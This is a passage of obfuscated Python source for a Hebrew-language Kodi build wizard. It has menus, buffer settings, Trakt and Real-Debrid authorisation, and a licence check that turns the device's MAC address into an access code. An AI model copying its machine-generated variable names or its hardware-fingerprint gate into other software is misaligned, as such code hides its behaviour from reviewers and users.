							OOOO000O000OO00OO =OOOO000O000OO00OO [:OOOO000O000OO00OO .find ('='+O0O000O000O00O00O ,OOOO000O000OO00OO .find (O0O000O000O00O00O ,1 ))]#line:1702
						if OOOO000O000OO00OO .rfind (O0O000O000O00O00O ,1 )>-1 :#line:1704
							OOOO000O000OO00OO =OOOO000O000OO00OO [1 :OOOO000O000OO00OO .rfind (O0O000O000O00O00O )]#line:1705
					else :#line:1706
						if OOOO000O000OO00OO .find (" ")>0 :#line:1707
							OOOO000O000OO00OO =OOOO000O000OO00OO [:OOOO000O000OO00OO .find (" ")]#line:1708
						elif OOOO000O000OO00OO .find ("/")>0 :#line:1709
							OOOO000O000OO00OO =OOOO000O000OO00OO [:OOOO000O000OO00OO .find ("/")]#line:1710
						elif OOOO000O000OO00OO .find (">")>0 :#line:1711
							OOOO000O000OO00OO =OOOO000O000OO00OO [:OOOO000O000OO00OO .find (">")]#line:1712
					O00OOO000OO000O00 .append (OOOO000O000OO00OO .strip ())#line:1714
			OO0O0O00O00O0OOOO =O00OOO000OO000O00 #line:1715
		else :#line:1716
			O00OOO000OO000O00 =[]#line:1717
			for OOO00OOOOOOOO0O00 in OO0O0O00O00O0OOOO :#line:1718
				O0OOOO0OO0O0O00OO =u"</"+name #line:1719
				O0OOO0000O0OOOO0O =O000O00O0O0OOO0O0 .find (OOO00OOOOOOOO0O00 )#line:1721
				OO00OOOO00O00OOOO =O000O00O0O0OOO0O0 .find (O0OOOO0OO0O0O00OO ,O0OOO0000O0OOOO0O )#line:1722
				OO000O0O00OO0O000 =O000O00O0O0OOO0O0 .find ("<"+name ,O0OOO0000O0OOOO0O +1 )#line:1723
				while OO000O0O00OO0O000 <OO00OOOO00O00OOOO and OO000O0O00OO0O000 !=-1 :#line:1725
					O0OO0OO00OOOO00O0 =O000O00O0O0OOO0O0 .find (O0OOOO0OO0O0O00OO ,OO00OOOO00O00OOOO +len (O0OOOO0OO0O0O00OO ))#line:1726
					if O0OO0OO00OOOO00O0 !=-1 :#line:1727
						OO00OOOO00O00OOOO =O0OO0OO00OOOO00O0 #line:1728
					OO000O0O00OO0O000 =O000O00O0O0OOO0O0 .find ("<"+name ,OO000O0O00OO0O000 +1 )#line:1729
				if O0OOO0000O0OOOO0O ==-1 and OO00OOOO00O00OOOO ==-1 :#line:1731
					OO00O0O000OOO0O00 =u""#line:1732
				elif O0OOO0000O0OOOO0O >-1 and OO00OOOO00O00OOOO >-1 :#line:1733
					OO00O0O000OOO0O00 =O000O00O0O0OOO0O0 [O0OOO0000O0OOOO0O +len (OOO00OOOOOOOO0O00 ):OO00OOOO00O00OOOO ]#line:1734
				elif OO00OOOO00O00OOOO >-1 :#line:1735
					OO00O0O000OOO0O00 =O000O00O0O0OOO0O0 [:OO00OOOO00O00OOOO ]#line:1736
				elif O0OOO0000O0OOOO0O >-1 :#line:1737
					OO00O0O000OOO0O00 =O000O00O0O0OOO0O0 [O0OOO0000O0OOOO0O +len (OOO00OOOOOOOO0O00 ):]#line:1738
				if ret :#line:1740
					O0OOOO0OO0O0O00OO =O000O00O0O0OOO0O0 [OO00OOOO00O00OOOO :O000O00O0O0OOO0O0 .find (">",O000O00O0O0OOO0O0 .find (O0OOOO0OO0O0O00OO ))+1 ]#line:1741
					OO00O0O000OOO0O00 =OOO00OOOOOOOO0O00 +OO00O0O000OOO0O00 +O0OOOO0OO0O0O00OO #line:1742
				O000O00O0O0OOO0O0 =O000O00O0O0OOO0O0 [O000O00O0O0OOO0O0 .find (OO00O0O000OOO0O00 ,O000O00O0O0OOO0O0 .find (OOO00OOOOOOOO0O00 ))+len (OO00O0O000OOO0O00 ):]#line:1744
				O00OOO000OO000O00 .append (OO00O0O000OOO0O00 )#line:1745
			OO0O0O00O00O0OOOO =O00OOO000OO000O00 #line:1746
		O00O0O0O00O000O00 +=OO0O0O00O00O0OOOO #line:1747
	return O00O0O0O00O000O00 #line:1749
def addItem (OOOO0O00000OO000O ,O0OOO0O00OO00000O ,O000OO00OO0OO0000 ,OO00OO0O0OOOOO0OO ,OO0O00OOO00O0OOO0 ,description =None ):#line:1751
	if description ==None :description =''#line:1752
	description ='[COLOR white]'+description +'[/COLOR]'#line:1753
	OOO000OOOO0OOOO00 =sys .argv [0 ]+"?url="+urllib .quote_plus (O0OOO0O00OO00000O )+"&mode="+str (O000OO00OO0OO0000 )+"&name="+urllib .quote_plus (OOOO0O00000OO000O )+"&iconimage="+urllib .quote_plus (OO00OO0O0OOOOO0OO )+"&fanart="+urllib .quote_plus (OO0O00OOO00O0OOO0 )#line:1754
	O0OO0O0OOO0OOOO00 =True #line:1755
	OOO000OO000000O0O =xbmcgui .ListItem (OOOO0O00000OO000O ,iconImage =OO00OO0O0OOOOO0OO ,thumbnailImage =OO00OO0O0OOOOO0OO )#line:1756
	OOO000OO000000O0O .setInfo (type ="Video",infoLabels ={"Title":OOOO0O00000OO000O ,"Plot":description })#line:1757
	OOO000OO000000O0O .setProperty ("fanart_Image",OO0O00OOO00O0OOO0 )#line:1758
	OOO000OO000000O0O .setProperty ("icon_Image",OO00OO0O0OOOOO0OO )#line:1759
	O0OO0O0OOO0OOOO00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO000OOOO0OOOO00 ,listitem =OOO000OO000000O0O ,isFolder =False )#line:1760
	return O0OO0O0OOO0OOOO00 #line:1761
def get_params ():#line:1763
		O00O0000O00O000O0 =[]#line:1764
		O00O0O0O0000O00O0 =sys .argv [2 ]#line:1765
		if len (O00O0O0O0000O00O0 )>=2 :#line:1766
				O0OO00O00O00O00OO =sys .argv [2 ]#line:1767
				OOOOO00OO0OO000OO =O0OO00O00O00O00OO .replace ('?','')#line:1768
				if (O0OO00O00O00O00OO [len (O0OO00O00O00O00OO )-1 ]=='/'):#line:1769
						O0OO00O00O00O00OO =O0OO00O00O00O00OO [0 :len (O0OO00O00O00O00OO )-2 ]#line:1770
				OOOO0O000O0OO00O0 =OOOOO00OO0OO000OO .split ('&')#line:1771
				O00O0000O00O000O0 ={}#line:1772
				for OOOO00OOO00000OOO in range (len (OOOO0O000O0OO00O0 )):#line:1773
						OOO00O0O00O00O0OO ={}#line:1774
						OOO00O0O00O00O0OO =OOOO0O000O0OO00O0 [OOOO00OOO00000OOO ].split ('=')#line:1775
						if (len (OOO00O0O00O00O0OO ))==2 :#line:1776
								O00O0000O00O000O0 [OOO00O0O00O00O0OO [0 ]]=OOO00O0O00O00O0OO [1 ]#line:1777
		return O00O0000O00O000O0 #line:1779
def decode (OO000OOO000O00O00 ,O00O0OOO0O00O0OOO ):#line:1784
    import base64 #line:1785
    O00O0OOO000O000O0 =[]#line:1786
    if (len (OO000OOO000O00O00 ))!=4 :#line:1788
     return 10 #line:1789
    O00O0OOO0O00O0OOO =base64 .urlsafe_b64decode (O00O0OOO0O00O0OOO )#line:1790
    for OOO0OO0000O00000O in range (len (O00O0OOO0O00O0OOO )):#line:1792
        OOOOOO00OO00O0000 =OO000OOO000O00O00 [OOO0OO0000O00000O %len (OO000OOO000O00O00 )]#line:1793
        OOO0OO0OOO00O0O00 =chr ((256 +ord (O00O0OOO0O00O0OOO [OOO0OO0000O00000O ])-ord (OOOOOO00OO00O0000 ))%256 )#line:1794
        O00O0OOO000O000O0 .append (OOO0OO0OOO00O0O00 )#line:1795
    return "".join (O00O0OOO000O000O0 )#line:1796
def tmdb_list (OOOOO000OO0OO0OO0 ):#line:1797
    OO000OOOO00O0OOOO =decode ("7643",OOOOO000OO0OO0OO0 )#line:1800
    return int (OO000OOOO00O0OOOO )#line:1803
def u_list (O00OO00O000OO0OO0 ):#line:1804
    from math import sqrt #line:1806
    OOOOO0000O00O0000 =tmdb_list (TMDB_NEW_API )#line:1807
    OO0000O0O0OOOOO00 =str ((getHwAddr ('eth0'))*OOOOO0000O00O0000 )#line:1809
    O0OOOO00OO00O0O00 =int (OO0000O0O0OOOOO00 [1 ]+OO0000O0O0OOOOO00 [2 ]+OO0000O0O0OOOOO00 [5 ]+OO0000O0O0OOOOO00 [7 ])#line:1810
    OOO00OO0O00O00O00 =(ADDON .getSetting ("pass"))#line:1812
    O0O000O0O0O000O00 =(str (round (sqrt ((O0OOOO00OO00O0O00 *700 )+50 )+50 ,4 ))[-4 :]).replace ('.','')#line:1817
    if '.'in O0O000O0O0O000O00 :#line:1818
     O0O000O0O0O000O00 =(str (round (sqrt ((O0OOOO00OO00O0O00 *700 )+50 )+50 ,4 ))[-5 :]).replace ('.','')#line:1819
    if OOO00OO0O00O00O00 ==O0O000O0O0O000O00 :#line:1821
      O0O0OOOOOOO0OO00O =O00OO00O000OO0OO0 #line:1823
    else :#line:1825
       if STARTP2 ()and STARTP ()=='ok':#line:1826
         return O00OO00O000OO0OO0 #line:1829
       O0O0OOOOOOO0OO00O ='https://www.google.com/search?&q=don%27t+take+my+money&oq=dont+take+my+moniey'#line:1830
       xbmcgui .Dialog ().ok ('הקוד שלך',' סיסמה שגויה')#line:1831
       sys .exit ()#line:1832
    return O0O0OOOOOOO0OO00O #line:1833
def disply_hwr ():#line:1836
   try :#line:1837
    O0O0O0000O00OOOO0 =tmdb_list (TMDB_NEW_API )#line:1838
    O0OOO0OO0O0OOOO00 =str ((getHwAddr ('eth0'))*O0O0O0000O00OOOO0 )#line:1839
    O0O0000O00O0000O0 =(O0OOO0OO0O0OOOO00 [1 ]+O0OOO0OO0O0OOOO00 [2 ]+O0OOO0OO0O0OOOO00 [5 ]+O0OOO0OO0O0OOOO00 [7 ])#line:1846
    OOOO00O00O00O00O0 =(ADDON .getSetting ("action"))#line:1847
    wiz .setS ('action',str (O0O0000O00O0000O0 ))#line:1849
   except :pass #line:1850
def disply_hwr2 ():#line:1851
   try :#line:1852
    O0000OOOO0OO0O0OO =tmdb_list (TMDB_NEW_API )#line:1853
    O0O00OOOOOO0000OO =str ((getHwAddr ('eth0'))*O0000OOOO0OO0O0OO )#line:1855
    OO00OOOOO0OO0OOOO =(O0O00OOOOOO0000OO [1 ]+O0O00OOOOOO0000OO [2 ]+O0O00OOOOOO0000OO [5 ]+O0O00OOOOOO0000OO [7 ])#line:1864
    O0000OO000OOOOO00 =(ADDON .getSetting ("action"))#line:1865
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",OO00OOOOO0OO0OOOO )#line:1868
   except :pass #line:1869
def getHwAddr (OO0000O0O00O00O0O ):#line:1871
   import subprocess ,time #line:1872
   O0OOOO0OOOOOO0OO0 ='windows'#line:1873
   if xbmc .getCondVisibility ('system.platform.android'):#line:1874
       O0OOOO0OOOOOO0OO0 ='android'#line:1875
   if xbmc .getCondVisibility ('system.platform.android'):#line:1876
     O0O000O00O0OO0O0O =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1877
     OO0000OO00OO00000 =re .compile ('link/ether (.+?) brd').findall (str (O0O000O00O0OO0O0O ))#line:1879
     O00000OOOOO000OOO =0 #line:1880
     for OOOO0000000O000OO in OO0000OO00OO00000 :#line:1881
      if OO0000OO00OO00000 !='00:00:00:00:00:00':#line:1882
          O00O0000O0OO000O0 =OOOO0000000O000OO #line:1883
          O00000OOOOO000OOO =O00000OOOOO000OOO +int (O00O0000O0OO000O0 .replace (':',''),16 )#line:1884
   elif xbmc .getCondVisibility ('system.platform.windows'):#line:1886
       O0O0O0O00000000O0 =0 #line:1887
       O00000OOOOO000OOO =0 #line:1888
       OOOO00O0OOOOO0O00 =[]#line:1889
       OO0000OOOO0O0000O =os .popen ("getmac").read ()#line:1890
       OO0000OOOO0O0000O =OO0000OOOO0O0000O .split ("\n")#line:1891
       for OOO00OOO0O00O0O00 in OO0000OOOO0O0000O :#line:1893
            O0000O00OO0O0O000 =re .search (r'([0-9A-F]{2}[:-]){5}([0-9A-F]{2})',OOO00OOO0O00O0O00 ,re .I )#line:1894
            if O0000O00OO0O0O000 :#line:1895
                OO0000OO00OO00000 =O0000O00OO0O0O000 .group ().replace ('-',':')#line:1896
                OOOO00O0OOOOO0O00 .append (OO0000OO00OO00000 )#line:1897
                O00000OOOOO000OOO =O00000OOOOO000OOO +int (OO0000OO00OO00000 .replace (':',''),16 )#line:1900
   else :#line:1902
         wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]לא ניתן לנפק קוד, פנה למנהלים.[/COLOR]'%COLOR2 )#line:1903
   try :#line:1920
    return O00000OOOOO000OOO #line:1921
   except :pass #line:1922
def getpass ():#line:1923
	disply_hwr2 ()#line:1925
def setpass ():#line:1926
    O000O00O00O0OO0O0 =xbmcgui .Dialog ()#line:1927
    O0OO00O0O000O0O00 =''#line:1928
    O0O00OO00OO0O0O0O =xbmc .Keyboard (O0OO00O0O000O0O00 ,'הכנס סיסמה')#line:1930
    O0O00OO00OO0O0O0O .doModal ()#line:1931
    if O0O00OO00OO0O0O0O .isConfirmed ():#line:1932
           O0O00OO00OO0O0O0O =O0O00OO00OO0O0O0O .getText ()#line:1933
    wiz .setS ('pass',str (O0O00OO00OO0O0O0O ))#line:1934
def setuname ():#line:1935
    O0OOOOOOOO00OOO00 =''#line:1936
    OOOOO000O0O0O0OOO =xbmc .Keyboard (O0OOOOOOOO00OOO00 ,'הכנס שם משתמש')#line:1937
    OOOOO000O0O0O0OOO .doModal ()#line:1938
    if OOOOO000O0O0O0OOO .isConfirmed ():#line:1939
           O0OOOOOOOO00OOO00 =OOOOO000O0O0O0OOO .getText ()#line:1940
           wiz .setS ('user',str (O0OOOOOOOO00OOO00 ))#line:1941
def powerkodi ():#line:1942
    os ._exit (1 )#line:1943
def buffer1 ():#line:1945
	O0OOO00O0OO0OO00O =xbmc .translatePath (os .path .join ('special://home/userdata','advancedsettings.xml'))#line:1946
	O0O0OO0OO0O000000 =xbmc .getInfoLabel ("System.Memory(total)")#line:1947
	OO0OOO0O0OO0O0OOO =xbmc .getInfoLabel ("System.FreeMemory")#line:1948
	OOO00O000O0O00OO0 =re .sub ('[^0-9]','',OO0OOO0O0OO0O0OOO )#line:1949
	OOO00O000O0O00OO0 =int (OOO00O000O0O00OO0 )/3 #line:1950
	OO0O0OO00O0O00O0O =OOO00O000O0O00OO0 *1024 *1024 #line:1951
	try :O0OO000OO00O0OO0O =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:1952
	except :O0OO000OO00O0OO0O =16 #line:1953
	OO00OOO00OO0OO00O =DIALOG .yesno ('FREE MEMORY: '+str (OO0OOO0O0OO0O0OOO ),'Based on your free Memory your optimal buffersize is: '+str (OOO00O000O0O00OO0 )+' MB','Choose an Option below...',yeslabel ='Use Optimal',nolabel ='Input a Value')#line:1956
	if OO00OOO00OO0OO00O ==1 :#line:1957
		with open (O0OOO00O0OO0OO00O ,"w")as OO0OO0OOOOO0OOO0O :#line:1958
			if O0OO000OO00O0OO0O >=17 :OOO000O0000O0O0O0 =xml_data_advSettings_New (str (OO0O0OO00O0O00O0O ))#line:1959
			else :OOO000O0000O0O0O0 =xml_data_advSettings_old (str (OO0O0OO00O0O00O0O ))#line:1960
			OO0OO0OOOOO0OOO0O .write (OOO000O0000O0O0O0 )#line:1962
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O0OO00O0O00O0O ),'Please restart Kodi for settings to apply.','')#line:1963
	elif OO00OOO00OO0OO00O ==0 :#line:1965
		OO0O0OO00O0O00O0O =_O0OOO0OOOO000000O (default =str (OO0O0OO00O0O00O0O ),heading ="INPUT BUFFER SIZE")#line:1966
		with open (O0OOO00O0OO0OO00O ,"w")as OO0OO0OOOOO0OOO0O :#line:1967
			if O0OO000OO00O0OO0O >=17 :OOO000O0000O0O0O0 =xml_data_advSettings_New (str (OO0O0OO00O0O00O0O ))#line:1968
			else :OOO000O0000O0O0O0 =xml_data_advSettings_old (str (OO0O0OO00O0O00O0O ))#line:1969
			OO0OO0OOOOO0OOO0O .write (OOO000O0000O0O0O0 )#line:1970
			DIALOG .ok ('Buffer Size Set to: '+str (OO0O0OO00O0O00O0O ),'Please restart Kodi for settings to apply.','')#line:1971
def xml_data_advSettings_old (O0OO0O0O0O000000O ):#line:1972
	OO0OO0O000O00OO00 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
		<cachemembuffersize>%s</cachemembuffersize> 
		<buffermode>2</buffermode>
		<readbufferfactor>20</readbufferfactor>
	  </network>
</advancedsettings>"""%O0OO0O0O0O000000O #line:1982
	return OO0OO0O000O00OO00 #line:1983
def xml_data_advSettings_New (O0000O0OO0OO00O0O ):#line:1985
	O00O0OOO0O000O000 ="""<advancedsettings>
	  <network>
	    <curlclienttimeout>10</curlclienttimeout>
	    <curllowspeedtime>20</curllowspeedtime>
	    <curlretries>2</curlretries>    
	  </network>
	  <cache>
		<memorysize>%s</memorysize> 
		<buffermode>2</buffermode>
		<readfactor>20</readfactor>
	  </cache>
</advancedsettings>"""%O0000O0OO0OO00O0O #line:1997
	return O00O0OOO0O000O000 #line:1998
def write_ADV_SETTINGS_XML (OOO0OOO0000O0O000 ):#line:1999
    if not os .path .exists (xml_file ):#line:2000
        with open (xml_file ,"w")as O00O000000O000O00 :#line:2001
            O00O000000O000O00 .write (xml_data )#line:2002
def _O0OOO0OOOO000000O (default ="",heading ="",hidden =False ):#line:2003
    ""#line:2004
    O0OO0O00OO0000O00 =xbmc .Keyboard (default ,heading ,hidden )#line:2005
    O0OO0O00OO0000O00 .doModal ()#line:2006
    if (O0OO0O00OO0000O00 .isConfirmed ()):#line:2007
        return unicode (O0OO0O00OO0000O00 .getText (),"utf-8")#line:2008
    return default #line:2009
def index ():#line:2011
	addFile ('[COLOR green]קוד חומרה שלך: %s [/COLOR]'%(HARDWAER ),'',icon =ICONBUILDS ,themeit =THEME1 )#line:2012
	addFile ('%s גירסה: %s'%(MCNAME ,KODIV ),'',icon =ICONBUILDS ,themeit =THEME3 )#line:2013
	if AUTOUPDATE =='Yes':#line:2014
		if wiz .workingURL (WIZARDFILE )==True :#line:2015
			O0OO0OOOO0O0O0000 =wiz .checkWizard ('version')#line:2016
			if O0OO0OOOO0O0O0000 >VERSION :addFile ('%s [v%s] [COLOR red][B][UPDATE v%s][/B][/COLOR]גירסת ויזארד: '%(ADDONTITLE ,VERSION ,O0OO0OOOO0O0O0000 ),'wizardupdate',themeit =THEME2 )#line:2017
			else :addFile ('%s [v%s] :גירסת ויזארד'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2018
		else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2019
	else :addFile ('%s [v%s]'%(ADDONTITLE ,VERSION ),'',themeit =THEME2 )#line:2020
	if len (BUILDNAME )>0 :#line:2021
		O0O000OOO00O0000O =wiz .checkBuild (BUILDNAME ,'version')#line:2022
		O0O0OOOO0O0O00O00 ='%s (v%s)'%(BUILDNAME ,BUILDVERSION )#line:2023
		if O0O000OOO00O0000O >BUILDVERSION :O0O0OOOO0O0O00O00 ='%s [COLOR red][B][UPDATE v%s][/B][/COLOR]'%(O0O0OOOO0O0O00O00 ,O0O000OOO00O0000O )#line:2024
		addDir (O0O0OOOO0O0O00O00 ,'viewbuild',BUILDNAME ,themeit =THEME4 )#line:2026
		try :#line:2028
		     O00O0O000OO000O0O =wiz .themeCount (BUILDNAME )#line:2029
		except :#line:2030
		   O00O0O000OO000O0O =False #line:2031
		if not O00O0O000OO000O0O ==False :#line:2032
			addFile ('None'if BUILDTHEME ==""else BUILDTHEME ,'theme',BUILDNAME ,themeit =THEME5 )#line:2033
	else :addDir ('לא הותקן בילד','builds',themeit =THEME4 )#line:2034
	addDir ('אפשרויות','mor',icon =ICONSAVE ,themeit =THEME1 )#line:2037
	addDir ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2038
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2039
	addFile ('אימות חשבונות','passandUsername',name ,'passandUsername',themeit =THEME1 )#line:2043
	addDir ('התקנה','builds',icon =ICONBUILDS ,themeit =THEME1 )#line:2045
	xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"lookandfeel.font","value":"Arial"}}')#line:2047
def morsetup ():#line:2049
	addDir ('שמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME1 )#line:2050
	addDir ('תפריט אימות סיסמה','passpin',icon =ICONMAINT ,themeit =THEME1 )#line:2051
	addDir ('הגדרת חשבון Rd ו Trakt','rdset',icon =ICONSAVE ,themeit =THEME1 )#line:2052
	addFile ('שלח לוג','logsend',icon =ICONMAINT ,themeit =THEME1 )#line:2053
	addDir ('תפריט גיבוי ושחזור','backmyupbuild',icon =ICONMAINT ,themeit =THEME1 )#line:2054
	addDir ('אפליקציות לאנדרואיד','apk',icon =ICONAPK ,themeit =THEME1 )#line:2058
	addFile ('בדיקת מהירות','speed',icon =ICONCONTACT ,themeit =THEME1 )#line:2059
	addFile ('חזרה לקודי','fixskin',icon =ICONMAINT ,themeit =THEME1 )#line:2062
	addFile ('בדיקה','testcommand',icon =ICONMAINT ,themeit =THEME1 )#line:2063
	addFile ('מפעיל הרחבות','kodi17fix',icon =ICONMAINT ,themeit =THEME1 )#line:2073
	setView ('files','viewType')#line:2074
def morsetup2 ():#line:2075
	addFile ('מתקין ומגדיר - קודי אנונימוס','',themeit =THEME3 )#line:2076
	addDir ('התקנת טורונטר','2',icon =ICONCONTACT ,themeit =THEME1 )#line:2077
	addDir ('התקנת פופקורן','3',icon =ICONCONTACT ,themeit =THEME1 )#line:2078
	addDir ('התקנת קוואסר','9',icon =ICONCONTACT ,themeit =THEME1 )#line:2079
	addDir ('התקנת אלמנטום','13',icon =ICONCONTACT ,themeit =THEME1 )#line:2080
	addFile ('עדכון נגנים מטאליק','8',icon =ICONCONTACT ,themeit =THEME1 )#line:2081
	addFile ('דיאלוג נגנים פשוט','18',icon =ICONCONTACT ,themeit =THEME1 )#line:2082
	addFile ('דיאלוג נגנים מתקדם','19',icon =ICONCONTACT ,themeit =THEME1 )#line:2083
	addFile ('ניקוי נוגן לאחרונה','17',icon =ICONCONTACT ,themeit =THEME1 )#line:2084
	addFile ('איפוס סיסמת מבוגרים','14',icon =ICONCONTACT ,themeit =THEME1 )#line:2085
	addFile ('תיקון פונט לשפות זרות','15',icon =ICONCONTACT ,themeit =THEME1 )#line:2086
def fastupdate ():#line:2087
		addFile ('עדכון מהיר','testnotify',themeit =THEME1 )#line:2088
def forcefastupdate ():#line:2090
			OOOO0O0O000000OO0 ="[COLOR %s]ברוכים הבאים לעדכון מהיר ידני[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,'')#line:2091
			wiz .ForceFastUpDate (ADDONTITLE ,OOOO0O0O000000OO0 )#line:2092
def rdsetup ():#line:2096
	addFile ('אימות חשבון RD אוטומטי','setrd2',icon =ICONMAINT ,themeit =THEME1 )#line:2097
	addFile ('אימות חשבון RD ידני','setrd',icon =ICONMAINT ,themeit =THEME1 )#line:2098
	addFile ('אימות חשבון Trakt','traktsync',icon =ICONMAINT ,themeit =THEME1 )#line:2100
	addFile ('ביטול RD','rdoff',icon =ICONMAINT ,themeit =THEME1 )#line:2101
def traktsetup ():#line:2104
	addFile ('[COLOR orange]Placenta[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','placentaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2105
	addFile ('[COLOR green]Reptilia Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','reptiliaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2106
	addFile ('[COLOR red]Flixnet[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','flixnetset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2107
	addFile ('[COLOR limegreen]Yoda[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','yodaset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2108
	addFile ('[COLOR blue]Numbers[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','numbersset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2109
	addFile ('[COLOR violet]Uranus[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','uranusset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2110
	addFile ('[COLOR yellow]Genesis Reborn[/COLOR] [COLOR gold]Trakt Authorization[/COLOR]','genesisset',fanart =FANART ,icon =ICONTRAKT ,themeit =THEME2 )#line:2111
	setView ('files','viewType')#line:2112
def setautorealdebrid ():#line:2113
    from resources .libs import real_debrid #line:2114
    O0O0OO0O0O0OOOO00 =real_debrid .RealDebridFirst ()#line:2115
    O0O0OO0O0O0OOOO00 .auth ()#line:2116
def setrealdebrid ():#line:2118
    OOO00OO0O0OO0O00O =(ADDON .getSetting ("auto_rd"))#line:2119
    if OOO00OO0O0OO0O00O =='false':#line:2120
       ADDON .openSettings ()#line:2121
    else :#line:2122
        from resources .libs import real_debrid #line:2123
        O0O0000O00O00O0OO =real_debrid .RealDebrid ()#line:2124
        O0O0000O00O00O0OO .auth ()#line:2125
        rdon ()#line:2128
def resolveurlsetup ():#line:2130
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.resolveurl/?mode=auth_rd)")#line:2131
def urlresolversetup ():#line:2132
	xbmc .executebuiltin ("RunPlugin(plugin://script.module.urlresolver/?mode=auth_rd)")#line:2133
def placentasetup ():#line:2135
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.placenta/?action=authTrakt)")#line:2136
def reptiliasetup ():#line:2137
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.reptilia/?action=authTrakt)")#line:2138
def flixnetsetup ():#line:2139
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.flixnet/?action=authTrakt)")#line:2140
def yodasetup ():#line:2141
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.Yoda/?action=authTrakt)")#line:2142
def numberssetup ():#line:2143
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.numbers/?action=authTrakt)")#line:2144
def uranussetup ():#line:2145
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.uranus/?action=authTrakt)")#line:2146
def genesissetup ():#line:2147
	xbmc .executebuiltin ("RunPlugin(plugin://plugin.video.genesisreborn/?action=authTrakt)")#line:2148
def net_tools (view =None ):#line:2150
	addFile ('Speed Tester','speed',icon =ICONAPK ,themeit =THEME1 )#line:2151
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2152
	setView ('files','viewType')#line:2154
def speedMenu ():#line:2155
	xbmc .executebuiltin ('Runscript("special://home/addons/plugin.program.Anonymous/speedtest.py")')#line:2156
def viewIP ():#line:2157
	OO000O000OO00OO00 =['System.FriendlyName','System.BuildVersion','System.CpuUsage','System.ScreenMode','Network.IPAddress','Network.MacAddress','System.Uptime','System.TotalUptime','System.FreeSpace','System.UsedSpace','System.TotalSpace','System.Memory(free)','System.Memory(used)','System.Memory(total)']#line:2171
	O0000OO0O000OO0OO =[];OO0O0O0OO0O00O0O0 =0 #line:2172
	for O0O0OOOO00O0OOOO0 in OO000O000OO00OO00 :#line:2173
		OO00O0OO0OO000OO0 =wiz .getInfo (O0O0OOOO00O0OOOO0 )#line:2174
		OOOOO00O000O0O000 =0 #line:2175
		while OO00O0OO0OO000OO0 =="Busy"and OOOOO00O000O0O000 <10 :#line:2176
			OO00O0OO0OO000OO0 =wiz .getInfo (O0O0OOOO00O0OOOO0 );OOOOO00O000O0O000 +=1 ;wiz .log ("%s sleep %s"%(O0O0OOOO00O0OOOO0 ,str (OOOOO00O000O0O000 )));xbmc .sleep (1000 )#line:2177
		O0000OO0O000OO0OO .append (OO00O0OO0OO000OO0 )#line:2178
		OO0O0O0OO0O00O0O0 +=1 #line:2179
	O0OOO00000OOO000O ,OOO00OO000000O0OO ,OO00O00O0OOO00OOO =getIP ()#line:2180
	addFile ('[COLOR %s]Local IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OO0O000OO0OO [4 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2181
	addFile ('[COLOR %s]External IP:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0OOO00000OOO000O ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2182
	addFile ('[COLOR %s]Provider:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OOO00OO000000O0OO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2183
	addFile ('[COLOR %s]Location:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,OO00O00O0OOO00OOO ),'',icon =ICONMAINT ,themeit =THEME2 )#line:2184
	addFile ('[COLOR %s]MacAddress:[/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR1 ,COLOR2 ,O0000OO0O000OO0OO [5 ]),'',icon =ICONMAINT ,themeit =THEME2 )#line:2185
	setView ('files','viewType')#line:2186
def buildMenu ():#line:2188
	if USERNAME =='':#line:2189
		ADDON .openSettings ()#line:2190
		sys .exit ()#line:2191
	if PASSWORD =='':#line:2192
		ADDON .openSettings ()#line:2193
	O00OOO00O0000O0OO =u_list (SPEEDFILE )#line:2194
	(O00OOO00O0000O0OO )#line:2195
	OOO00O0O00OO00OOO =(wiz .workingURL (O00OOO00O0000O0OO ))#line:2196
